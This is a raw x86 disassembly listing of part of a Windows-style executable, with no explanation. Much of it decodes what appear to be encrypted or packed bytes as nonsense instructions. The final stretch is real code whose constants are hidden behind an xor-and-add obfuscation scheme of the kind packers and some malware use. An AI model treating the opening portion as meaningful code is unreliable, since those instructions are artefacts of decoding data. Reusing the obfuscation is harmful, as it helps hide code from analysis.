  40588f:	rcl    BYTE PTR [esp+esi*4-0x73],1
  405893:	(bad)  
  405894:	aas    
  405895:	gs dec edx
  405897:	mov    al,0x3
  405899:	add    DWORD PTR [eax+0x70],ebp
  40589c:	sbb    DWORD PTR [edx+0x8],0x6a286939
  4058a3:	sbb    BYTE PTR [edx],ah
  4058a5:	sbb    al,0xd7
  4058a7:	dec    ebx
  4058a8:	mov    dl,0x42
  4058aa:	cdq    
  4058ab:	jg     0x40590f
  4058ad:	jne    0x405894
  4058af:	xor    al,0xb4
  4058b1:	mov    ch,0x85
  4058b3:	lods   al,BYTE PTR ds:[esi]
  4058b4:	pop    ax
  4058b6:	pop    eax
  4058b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058b8:	fld    DWORD PTR [ebx+0x337940f1]
  4058be:	push   ebx
  4058bf:	int3   
  4058c0:	xchg   DWORD PTR [edx+0x31],eax
  4058c3:	stos   DWORD PTR es:[edi],eax
  4058c4:	mov    ecx,0xfc0a49c1
  4058c9:	loopne 0x4058ec
  4058cb:	icebp  
  4058cc:	mov    ecx,0xecb24588
  4058d1:	xchg   edx,eax
  4058d2:	sub    ch,BYTE PTR [eax+0x4d]
  4058d5:	iret   
  4058d6:	dec    edi
  4058d7:	or     DWORD PTR [edx-0x23],ecx
  4058da:	outs   dx,BYTE PTR ds:[esi]
  4058db:	bound  esi,QWORD PTR [edi+esi*8]
  4058de:	std    
  4058df:	add    bh,BYTE PTR [ecx-0x30]
  4058e2:	xor    edx,eax
  4058e4:	out    dx,al
  4058e5:	aad    0x20
  4058e7:	xchg   DWORD PTR [eax+0x34062d40],edx
  4058ed:	shl    BYTE PTR [ecx+0x42],0x67
  4058f1:	mov    edx,0x3d12c844
  4058f6:	data16 lahf 
  4058f8:	fsub   QWORD PTR [eax]
  4058fa:	mov    edx,0x26a8b480
  4058ff:	int3   
  405900:	out    0x42,al
  405902:	retf   0x2672
  405905:	ret    0xce7d
  405908:	push   ebx
  405909:	or     BYTE PTR [esi],dh
  40590b:	scas   al,BYTE PTR es:[edi]
  40590c:	lea    ecx,[eax+0xda5c8c9]
  405912:	jecxz  0x4058d5
  405914:	cmp    eax,0x7100d01e
  405919:	and    DWORD PTR ds:0xd0620542,ecx
  40591f:	sub    DWORD PTR [edi+eiz*8+0x60],ebp
  405923:	ins    BYTE PTR es:[edi],dx
  405924:	pop    ebx
  405925:	and    BYTE PTR [ecx-0x338826c1],dh
  40592b:	jmp    0xf4f8:0x3724c043
  405932:	pop    ebx
  405933:	sbb    al,0xbf
  405935:	loopne 0x4058e2
  405937:	in     al,dx
  405938:	inc    edx
  405939:	gs cmp dh,bl
  40593c:	jo     0x405910
  40593e:	sub    dh,BYTE PTR [ebp-0x269a44c8]
  405944:	jge    0x40591e
  405946:	mov    fs,WORD PTR [ebx]
  405948:	(bad)  
  405949:	ins    BYTE PTR es:[edi],dx
  40594a:	push   ebx
  40594b:	dec    esp
  40594c:	stos   DWORD PTR es:[edi],eax
  40594d:	push   ds
  40594e:	dec    edi
  40594f:	mov    bl,0x71
  405951:	inc    edx
  405952:	inc    ebx
  405953:	mov    dh,0x58
  405955:	mov    cl,0xac
  405957:	mov    DWORD PTR gs:[eax-0x4373f3d4],0x6d2a8589
  405962:	scas   al,BYTE PTR es:[edi]
  405963:	adc    eax,0x4b61d0ac
  405968:	adc    DWORD PTR [ebp-0x4b5af31a],ebp
  40596e:	mov    esi,0x97045fc5
  405973:	ins    DWORD PTR es:[edi],dx
  405974:	fist   DWORD PTR [eax]
  405976:	enter  0x4ee8,0xcf
  40597a:	repnz add ebx,DWORD PTR [ebx+eax*1]
  40597e:	lods   al,BYTE PTR ds:[esi]
  40597f:	pop    ss
  405980:	mov    dh,BYTE PTR [eax-0x1c07ee02]
  405986:	(bad)
  40598a:	jno    0x4059e6
  40598c:	aad    0x2b
  40598e:	sbb    ecx,DWORD PTR [edi+0x6e453629]
  405994:	dec    edi
  405995:	inc    esp
  405996:	shl    DWORD PTR [eax],0xea
  405999:	or     al,cl
  40599b:	inc    edx
  40599c:	mov    dl,0x48
  40599e:	fistp  WORD PTR [ebp+0x30096970]
  4059a4:	mov    WORD PTR [edx+0x2f],?
  4059a7:	fdivr  QWORD PTR [edx]
  4059a9:	push   esi
  4059aa:	jge    0x405942
  4059ac:	bswap  ebx
  4059ae:	call   0x5e851e5f
  4059b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059b4:	mov    ds,WORD PTR [ebx-0x5a2c33db]
  4059ba:	psrlw  mm0,mm4
  4059bd:	loopne 0x4059f0
  4059bf:	adc    al,0x1
  4059c1:	or     BYTE PTR [esi],dh
  4059c3:	nop
  4059c4:	call   0xe118:0x8e213b1f
  4059cb:	jg     0x405a3c
  4059cd:	daa    
  4059ce:	popa   
  4059cf:	mov    edi,DWORD PTR [ecx+0x10]
  4059d2:	or     al,0x4e
  4059d4:	fist   DWORD PTR [ebx]
  4059d6:	ret    
  4059d7:	jmp    0x93687843
  4059dc:	inc    esi
  4059dd:	(bad)  
  4059de:	cmp    DWORD PTR [esi-0x7f],edi
  4059e1:	hlt    
  4059e2:	mov    al,ds:0x7370e151
  4059e7:	fnstcw WORD PTR [eax+0x5e]
  4059ea:	mov    al,ds:0xaf599659
  4059ef:	jge    0x40597c
  4059f1:	and    al,0xb9
  4059f3:	push   esi
  4059f4:	jp     0x4059d1
  4059f6:	arpl   WORD PTR [esi],si
  4059f8:	pop    ebx
  4059f9:	xchg   BYTE PTR [ecx],ch
  4059fb:	sub    ecx,ebp
  4059fd:	gs call 0x6995:0xc7d27039
  405a05:	call   0xc02f74ee
  405a0a:	jg     0x405a62
  405a0c:	jge    0x405a8c
  405a0e:	sahf   
  405a0f:	push   es
  405a10:	add    BYTE PTR [ebp-0x5f],0x50
  405a14:	adc    eax,0xce226948
  405a19:	ret    
  405a1a:	inc    ecx
  405a1b:	jmp    0xe61a:0xe21b31bc
  405a22:	lock mov eax,ds:0x29e155f
  405a28:	xor    al,0xc9
  405a2a:	jp     0x405a46
  405a2c:	cdq    
  405a2d:	adc    DWORD PTR [ebx],0xffffffe0
  405a30:	pop    ebp
  405a31:	jmp    0x405aaf
  405a33:	test   al,0x1c
  405a35:	sub    eax,0x11a8f3e1
  405a3a:	test   ch,dh
  405a3c:	cmp    esi,DWORD PTR [eax-0x472d7d28]
  405a42:	fs xchg edx,eax
  405a44:	sub    DWORD PTR [ebx+0x55b662a5],0xfffffff6
  405a4b:	mov    ah,0xc9
  405a4d:	jmp    0x53de:0x67bff679
  405a54:	add    BYTE PTR [edi-0x1f],0xf4
  405a58:	xchg   ecx,eax
  405a59:	daa    
  405a5a:	adc    eax,0x1dc826ea
  405a5f:	push   0x86d29e6e
  405a64:	mov    dl,0xb1
  405a66:	sub    esp,DWORD PTR [edx]
  405a68:	mov    ah,0x2e
  405a6a:	int3   
  405a6b:	cmp    bh,0x81
  405a6e:	clc    
  405a6f:	std    
  405a70:	xor    DWORD PTR [eax+0x3],0x53
  405a74:	test   DWORD PTR [edx-0x49],0xa3e3e99e
  405a7b:	jbe    0x405a7b
  405a7d:	popf   
  405a7e:	call   0x9e51:0xfbc61240
  405a85:	aaa    
  405a86:	fcom   DWORD PTR [ebp-0x7df277e4]
  405a8c:	data16 aam 0x98
  405a8f:	jp     0x405ae2
  405a91:	(bad)  
  405a92:	in     eax,dx
  405a93:	or     al,0x2b
  405a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a96:	inc    eax
  405a97:	adc    DWORD PTR [ebx+0x44],esp
  405a9a:	repz jbe 0x405a58
  405a9d:	add    bh,ch
  405a9f:	sbb    al,0xb9
  405aa1:	or     al,0x88
  405aa3:	into   
  405aa4:	popf   
  405aa5:	cs shl ebp,0xf3
  405aa9:	mov    dh,0x5a
  405aab:	imul   esp,esp,0x13d9e343
  405ab1:	fnstenv [eax-0x3d9781e]
  405ab7:	lea    eax,[eax-0x19ae9411]
  405abd:	jmp    0x7f21ac11
  405ac2:	(bad)  
  405ac3:	ins    BYTE PTR es:[edi],dx
  405ac4:	arpl   WORD PTR [esi-0x5962fbe0],di
  405aca:	std    
  405acb:	(bad)  
  405acc:	dec    ebx
  405acd:	mov    ah,0x66
  405acf:	ret    
  405ad0:	aad    0xfd
  405ad2:	pop    esi
  405ad3:	inc    eax
  405ad4:	mov    esi,0x3448e9fb
  405ad9:	jp     0x405afe
  405adb:	scas   al,BYTE PTR es:[edi]
  405adc:	ins    BYTE PTR es:[edi],dx
  405add:	push   ecx
  405ade:	mov    ds:0x6c57c406,eax
  405ae3:	mov    edi,0x3d29d15f
  405ae8:	push   esp
  405ae9:	and    dh,dl
  405aeb:	std    
  405aec:	adc    eax,0x963a202b
  405af1:	jnp    0x405b39
  405af3:	jg     0x405a7c
  405af5:	loop   0x405ae0
  405af7:	mov    al,0xf4
  405af9:	xchg   esi,eax
  405afa:	fdiv   st,st(7)
  405afc:	and    DWORD PTR [esi-0x70673cbc],ebx
  405b02:	pop    esp
  405b03:	xlat   BYTE PTR ds:[ebx]
  405b04:	add    dl,ch
  405b06:	mov    ebp,0x3d7d4aa0
  405b0b:	jl     0x405a95
  405b0d:	sbb    DWORD PTR [edx-0x459240e],ebp
  405b13:	adc    cl,BYTE PTR [ecx]
  405b15:	sbb    ebp,0x50631620
  405b1b:	lods   eax,DWORD PTR ds:[esi]
  405b1c:	jmp    0x553967f1
  405b21:	lods   al,BYTE PTR ds:[esi]
  405b22:	mov    bh,0xff
  405b24:	mov    ecx,0x36dfa88a
  405b29:	ret    
  405b2a:	sbb    DWORD PTR [ecx],edi
  405b2c:	or     BYTE PTR [eax-0x59],bh
  405b2f:	ret    
  405b30:	scas   al,BYTE PTR es:[edi]
  405b31:	cmp    al,0xe3
  405b33:	pop    ebx
  405b34:	test   eax,0xae0fde89
  405b39:	xchg   esi,eax
  405b3a:	or     BYTE PTR [edx+0x3ac0346b],0xf2
  405b41:	dec    ebx
  405b42:	mov    al,ds:0x2caafc9
  405b47:	es je  0x405ad7
  405b4a:	mov    ah,0x3
  405b4c:	xor    ecx,DWORD PTR [edi+0x18]
  405b4f:	inc    esi
  405b50:	rcr    BYTE PTR [esi],1
  405b52:	jmp    0xf16d:0xaab07bde
  405b59:	mov    dh,bl
  405b5b:	loope  0x405baa
  405b5d:	(bad)  
  405b5e:	cmc    
  405b5f:	aad    0x2e
  405b61:	aam    0x9c
  405b63:	inc    edi
  405b64:	(bad)  
  405b65:	push   ss
  405b66:	dec    ebx
  405b67:	and    bl,BYTE PTR [edi-0x1d5262cc]
  405b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b6e:	pop    edi
  405b6f:	jno    0x405b9c
  405b71:	xchg   ecx,eax
  405b72:	aaa    
  405b73:	add    BYTE PTR [edi],cl
  405b75:	xchg   edx,eax
  405b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b77:	mov    esi,0x7a127587
  405b7c:	in     eax,0x54
  405b7e:	clc    
  405b7f:	mov    ds:0x638fe8f5,eax
  405b84:	push   0x6447ea34
  405b89:	lea    esp,[ecx+0x31]
  405b8c:	and    al,0x43
  405b8e:	aaa    
  405b8f:	ss clc 
  405b91:	aad    0xa2
  405b93:	sbb    DWORD PTR es:[ebp-0x45b529d0],eax
  405b9a:	jno    0x405b24
  405b9c:	fisub  WORD PTR [esi+eax*1-0x47489a4c]
  405ba3:	test   al,0xa8
  405ba5:	addr16 gs inc esp
  405ba8:	dec    esi
  405ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405baa:	or     DWORD PTR [esi-0x57eb052b],esi
  405bb0:	repnz aas 
  405bb2:	(bad)  
  405bb3:	xchg   esp,eax
  405bb4:	mov    al,0x8a
  405bb6:	adc    edi,DWORD PTR [eax+0x1a85a1df]
  405bbc:	sahf   
  405bbd:	sar    DWORD PTR [ebx-0x5b244cf],0xf1
  405bc4:	pop    eax
  405bc5:	in     eax,0x7d
  405bc7:	sub    al,0xb5
  405bc9:	push   edi
  405bca:	in     eax,dx
  405bcb:	ins    BYTE PTR es:[edi],dx
  405bcc:	mov    BYTE PTR [edx],ch
  405bce:	or     BYTE PTR [esp+ecx*4-0x27712d9e],cl
  405bd5:	xchg   esp,eax
  405bd6:	jg     0x405bee
  405bd8:	not    BYTE PTR [ecx]
  405bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bdb:	cmp    eax,ebx
  405bdd:	fistp  WORD PTR [eax+0x2ba5aecc]
  405be3:	inc    eax
  405be4:	leave  
  405be5:	ins    DWORD PTR es:[edi],dx
  405be6:	xchg   esp,eax
  405be7:	pop    ebp
  405be8:	add    esi,DWORD PTR [ebx]
  405bea:	dec    ebx
  405beb:	add    eax,0x6d942c68
  405bf0:	cld    
  405bf1:	nop
  405bf2:	and    DWORD PTR [ebp+eax*2-0x6c],eax
  405bf6:	mov    al,0xb7
  405bf8:	sub    al,0x8f
  405bfa:	(bad)  [ecx-0x8952a99]
  405c00:	mov    BYTE PTR [eax],0x5
  405c03:	push   ss
  405c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c05:	popa   
  405c06:	push   es
  405c07:	test   al,0x6d
  405c09:	xchg   esp,eax
  405c0a:	outs   dx,DWORD PTR ds:[esi]
  405c0b:	(bad)  
  405c0c:	xor    dl,dh
  405c0e:	dec    edi
  405c0f:	fadd   DWORD PTR [esi]
  405c11:	jmp    0xd947042e
  405c16:	je     0x405c5f
  405c18:	scas   al,BYTE PTR es:[edi]
  405c19:	or     bh,BYTE PTR [ecx+ebp*4-0x2501a412]
  405c20:	(bad)  
  405c21:	adc    BYTE PTR [edx-0x38],dl
  405c24:	jb     0x405c0e
  405c26:	sbb    esi,edx
  405c28:	xchg   ebp,eax
  405c29:	adc    eax,0x85428ecf
  405c2e:	inc    esi
  405c2f:	mov    esp,0xf6145a59
  405c34:	xchg   BYTE PTR [edx+0x44],dh
  405c37:	sbb    esi,DWORD PTR [ebp-0x7b]
  405c3a:	test   eax,0x59fff793
  405c3f:	pop    ds
  405c40:	or     dl,bl
  405c42:	retf   0xa356
  405c45:	adc    bh,BYTE PTR [ebp+0x3c01ea6]
  405c4b:	gs test eax,0x2be6dcc9
  405c51:	popa   
  405c52:	jle    0x405bdf
  405c54:	cmp    BYTE PTR [edx],0xe3
  405c57:	xchg   esp,eax
  405c58:	test   eax,0x478370c2
  405c5d:	xchg   esi,eax
  405c5e:	iret   
  405c5f:	int3   
  405c60:	enter  0x208a,0xd
  405c64:	cmp    ebp,DWORD PTR [edx]
  405c66:	mov    BYTE PTR [eax],dl
  405c68:	lgs    edx,FWORD PTR [ecx]
  405c6b:	cwde   
  405c6c:	add    BYTE PTR [esi-0xb],bl
  405c6f:	or     cl,BYTE PTR [esi-0x7fa1f7d4]
  405c75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c76:	imul   ebx,DWORD PTR [eax+0x2b],0x20
  405c7a:	jecxz  0x405cd3
  405c7c:	test   al,0x9b
  405c7e:	mov    eax,ds:0x978cd457
  405c83:	mov    al,0x27
  405c85:	imul   ebp,DWORD PTR [edx],0xa8abdb67
  405c8b:	dec    ebx
  405c8c:	or     al,BYTE PTR [ebx-0x19733f6f]
  405c92:	stc    
  405c93:	sar    DWORD PTR [ebx+0x4a0cc263],1
  405c99:	mov    esi,DWORD PTR [eax+0x58c97dea]
  405c9f:	jmp    0xb89:0xebcc000a
  405ca6:	jns    0x405d1c
  405ca8:	(bad)  
  405ca9:	sub    eax,0x7e5e65ce
  405cae:	(bad)  
  405caf:	data16 xor al,0x66
  405cb2:	inc    esp
  405cb3:	in     al,0x2f
  405cb5:	cld    
  405cb6:	jmp    FWORD PTR [esi+ecx*1-0x3c57d60]
  405cbd:	xlat   BYTE PTR ds:[ebx]
  405cbe:	fnstsw WORD PTR ds:0xbaaa162e
  405cc4:	mov    eax,ds:0xb67d36d6
  405cc9:	or     ah,al
  405ccb:	mov    es,WORD PTR [edi+0xb054a43]
  405cd1:	test   al,0x34
  405cd3:	sbb    ebp,0xe3f8ec07
  405cd9:	inc    edx
  405cda:	mov    WORD PTR [edi-0x7eeb336e],fs
  405ce0:	not    bx
  405ce3:	jno    0x405cae
  405ce5:	in     eax,dx
  405ce6:	ffree  st(0)
  405ce8:	aad    0xf9
  405cea:	sar    DWORD PTR [edx],0xd7
  405ced:	xor    DWORD PTR [edi-0x40],0xbd27f96f
  405cf4:	rcr    al,1
  405cf6:	inc    eax
  405cf7:	in     al,0xf5
  405cf9:	jb     0x405d25
  405cfb:	fistp  QWORD PTR [edx-0x38611dcd]
  405d01:	cmp    eax,0x23e388a9
  405d06:	arpl   cx,bp
  405d08:	rcl    BYTE PTR [edi],cl
  405d0a:	xchg   esp,eax
  405d0b:	out    0xde,eax
  405d0d:	adc    ebp,eax
  405d0f:	sahf   
  405d10:	jno    0x405d68
  405d12:	ret    0xc846
  405d15:	ss ds or al,0xc8
  405d19:	xor    BYTE PTR fs:[esi-0x45],cl
  405d1d:	cmc    
  405d1e:	js     0x405d02
  405d20:	daa    
  405d21:	es mov edx,0x1e047896
  405d27:	jo     0x405d7e
  405d29:	call   0x8afc:0x4a39b1ff
  405d30:	pop    esi
  405d31:	adc    eax,0x35c8363e
  405d36:	push   cs
  405d37:	leave  
  405d38:	sub    DWORD PTR [edx-0x61],edi
  405d3b:	je     0x405d6d
  405d3d:	ins    BYTE PTR es:[edi],dx
  405d3e:	xchg   esi,eax
  405d3f:	adc    al,0x6b
  405d41:	dec    esi
  405d42:	cmp    esi,0x37
  405d45:	xchg   DWORD PTR [ebx-0x4d68f600],ecx
  405d4b:	jmp    0x5aad:0xc7d6d757
  405d52:	jecxz  0x405cdd
  405d54:	xor    eax,edi
  405d56:	es popa 
  405d58:	mov    dl,0x3f
  405d5a:	fsub   DWORD PTR [ecx+ebp*4]
  405d5d:	retf   
  405d5e:	scas   eax,DWORD PTR es:[edi]
  405d5f:	and    eax,0x75bdaae2
  405d64:	mov    ebx,0x22d05b30
  405d69:	cwde   
  405d6a:	xchg   DWORD PTR [ebx+0x48],ebx
  405d6d:	adc    edi,DWORD PTR [edx]
  405d6f:	push   edx
  405d70:	dec    ecx
  405d71:	mov    ecx,0x5b04c8b2
  405d76:	pop    edx
  405d77:	or     bl,ch
  405d79:	and    eax,0x91d33e43
  405d7e:	adc    eax,0x7af66408
  405d83:	xchg   DWORD PTR [ecx-0x25],edx
  405d86:	add    bh,BYTE PTR [edi-0x43]
  405d89:	mov    DWORD PTR [ebx+0x5a73c929],esp
  405d8f:	cli    
  405d90:	xchg   BYTE PTR [ebx+0x17151dcf],bl
  405d96:	inc    eax
  405d97:	jmp    0x405d5b
  405d99:	out    0x99,al
  405d9b:	and    eax,DWORD PTR [eax]
  405d9d:	mov    esp,0xf52855b
  405da2:	adc    DWORD PTR [ecx+0x4e],0xa8eefbaa
  405da9:	test   dl,bh
  405dab:	rol    DWORD PTR [ebx+0x16],cl
  405dae:	pushf  
  405daf:	(bad)  
  405db0:	fbstp  TBYTE PTR [eax]
  405db2:	aaa    
  405db3:	jns    0x405e22
  405db5:	(bad)  
  405db6:	stos   BYTE PTR es:[edi],al
  405db7:	xchg   ecx,eax
  405db8:	sbb    esi,DWORD PTR [ecx]
  405dba:	add    dl,BYTE PTR [ebx]
  405dbc:	bound  esi,QWORD PTR [esi]
  405dbe:	jmp    0xef09:0x38dd5b8d
  405dc5:	enter  0xb77f,0xc4
  405dc9:	add    bl,BYTE PTR [ecx+0x67]
  405dcc:	jo     0x405d54
  405dce:	mov    ch,0xd8
  405dd0:	xchg   ecx,eax
  405dd1:	mov    ds:0x461c5233,ax
  405dd7:	sub    BYTE PTR [edx+0x379f7497],al
  405ddd:	cmp    bl,bh
  405ddf:	inc    eax
  405de0:	popa   
  405de1:	mov    ah,0x46
  405de3:	out    0xa,al
  405de5:	scas   eax,DWORD PTR es:[edi]
  405de6:	adc    eax,0xffe50f80
  405deb:	sbb    eax,0x14f7b6c6
  405df0:	call   0xf2b5452b
  405df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405df6:	jg     0x405e48
  405df8:	scas   al,BYTE PTR es:[edi]
  405df9:	add    BYTE PTR [ecx],ch
  405dfb:	lods   al,BYTE PTR ds:[esi]
  405dfc:	aad    0x8d
  405dfe:	sahf   
  405dff:	add    esp,DWORD PTR [eax+0x892de5b]
  405e05:	push   edx
  405e06:	xor    al,0xde
  405e08:	int    0xe3
  405e0a:	cs pop edx
  405e0c:	in     al,dx
  405e0d:	imul   esp,DWORD PTR ds:0x231c637f,0xa73ea661
  405e17:	(bad)  
  405e18:	adc    BYTE PTR [esi],ch
  405e1a:	inc    ecx
  405e1b:	or     ecx,edi
  405e1d:	les    ebp,FWORD PTR [edi+0x174c219f]
  405e23:	gs fwait
  405e25:	xor    cl,bh
  405e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e28:	into   
  405e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e2a:	call   0xe737:0x16070d12
  405e31:	dec    ecx
  405e32:	ins    DWORD PTR es:[edi],dx
  405e33:	xchg   edx,eax
  405e34:	mov    ecx,eax
  405e36:	push   esp
  405e37:	int    0x3f
  405e39:	cli    
  405e3a:	rcl    DWORD PTR [ebx+0x5b06f839],0x60
  405e41:	ins    DWORD PTR es:[edi],dx
  405e42:	inc    ebx
  405e43:	and    al,0x9b
  405e45:	ins    DWORD PTR es:[edi],dx
  405e46:	mov    eax,DWORD PTR [edi+0x35]
  405e49:	fcomp  DWORD PTR [ebp+eiz*1+0x23]
  405e4d:	ins    DWORD PTR es:[edi],dx
  405e4e:	inc    esp
  405e4f:	xchg   ecx,eax
  405e50:	xor    BYTE PTR [esi],0xef
  405e53:	pop    ebx
  405e54:	js     0x405eae
  405e56:	enter  0x33a6,0x1c
  405e5a:	in     eax,dx
  405e5b:	mov    ebx,0xccbb5e88
  405e60:	adc    eax,0x219253b6
  405e65:	out    0xae,al
  405e67:	test   al,0xef
  405e69:	or     bl,bh
  405e6b:	cmp    BYTE PTR [ebx+ebx*2+0x37],bl
  405e6f:	xchg   edx,eax
  405e70:	mov    esp,ebx
  405e72:	xchg   edx,eax
  405e73:	pop    ebp
  405e74:	xchg   esi,eax
  405e75:	jae    0x405e2c
  405e77:	or     BYTE PTR [eax+0x2c],0x3d
  405e7b:	add    bh,BYTE PTR [ebp+0x36dce4b4]
  405e81:	popf   
  405e82:	jb     0x405e1c
  405e84:	mov    esp,0xcd924773
  405e89:	xor    eax,0x2a06f3d5
  405e8e:	inc    eax
  405e8f:	mov    al,ds:0xd5ed3c9a
  405e94:	rcr    DWORD PTR [ebp-0x77],cl
  405e97:	and    eax,0x60e2a475
  405e9c:	(bad)  [edx]
  405e9e:	mov    al,ds:0x808bf735
  405ea3:	xor    eax,0xbcdadbee
  405ea8:	jnp    0x405e3d
  405eaa:	jo     0x405e52
  405eac:	cmp    bh,al
  405eae:	or     esp,DWORD PTR [ebp+0x2c391be4]
  405eb4:	xchg   ebx,eax
  405eb5:	loop   0x405e43
  405eb7:	and    esp,DWORD PTR [esi+eiz*2+0x31]
  405ebb:	fwait
  405ebc:	int3   
  405ebd:	call   0xaf3e6d0e
  405ec2:	inc    edi
  405ec3:	out    dx,eax
  405ec4:	cwde   
  405ec5:	sbb    al,0x32
  405ec7:	push   esp
  405ec8:	sbb    edx,DWORD PTR [ebp-0x54f1726c]
  405ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ecf:	add    dl,ch
  405ed1:	outs   dx,DWORD PTR ds:[esi]
  405ed2:	or     al,BYTE PTR [edi]
  405ed4:	push   ebx
  405ed5:	jns    0x405e83
  405ed7:	into   
  405ed8:	out    dx,al
  405ed9:	popf   
  405eda:	int3   
  405edb:	xor    BYTE PTR [ecx-0x4],dl
  405ede:	retf   
  405edf:	pop    ebx
  405ee0:	fstp   st(3)
  405ee2:	jecxz  0x405f59
  405ee4:	cmc    
  405ee5:	imul   ebp,DWORD PTR [ecx+0x13],0xadc8312f
  405eec:	push   esi
  405eed:	mov    eax,ds:0x9d6a80bd
  405ef2:	sbb    edi,DWORD PTR [esi+esi*1-0x76]
  405ef6:	sbb    eax,0x5069c80f
  405efb:	adc    BYTE PTR [ecx+0x14],ah
  405efe:	jmp    0xe2bd:0xb1095645
  405f05:	adc    ebx,DWORD PTR [ebx]
  405f07:	mov    dl,0xc6
  405f09:	push   ebx
  405f0a:	cmp    ebp,DWORD PTR [ebx]
  405f0c:	ficomp DWORD PTR [esi+edi*2]
  405f0f:	push   ecx
  405f10:	sbb    ebx,DWORD PTR [eax-0x17]
  405f13:	loope  0x405f45
  405f15:	fs jmp 0x27e35fc6
  405f1b:	ins    BYTE PTR es:[edi],dx
  405f1c:	popa   
  405f1d:	aad    0x1e
  405f1f:	nop
  405f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f21:	sub    ch,al
  405f23:	xchg   ecx,eax
  405f24:	psrld  mm0,QWORD PTR [ebx]
  405f27:	mov    ds:0xa00b313b,al
  405f2c:	mov    esi,0x5a45c9b1
  405f31:	mov    bh,0x8a
  405f33:	add    BYTE PTR ds:0x80fe543f,0x43
  405f3a:	nop
  405f3b:	or     BYTE PTR [ecx],ah
  405f3d:	and    BYTE PTR [ebp+0x3c5c2834],bl
  405f43:	or     BYTE PTR [ecx+0x39],bl
  405f46:	mov    dh,0x89
  405f48:	inc    ebp
  405f49:	aam    0x8b
  405f4b:	inc    ebp
  405f4c:	test   al,0x2b
  405f4e:	ror    DWORD PTR [ecx+0x458be445],0xe4
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
